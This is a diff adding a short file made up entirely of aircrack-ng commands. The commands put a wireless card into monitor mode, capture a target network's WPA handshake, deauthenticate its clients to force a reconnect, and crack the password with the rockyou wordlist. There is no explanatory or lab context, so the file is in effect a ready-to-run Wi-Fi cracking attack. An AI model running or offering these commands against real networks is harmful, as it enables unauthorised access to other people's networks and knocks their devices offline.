@@ -1,0 +1,6 @@
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -d AA:AB:AC:AD:AE:AF -c 1 --write handshake wlan0
+aireplay-ng --deauth 5 -a AA:AB:AC:AD:AE:AF wlan0
+aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
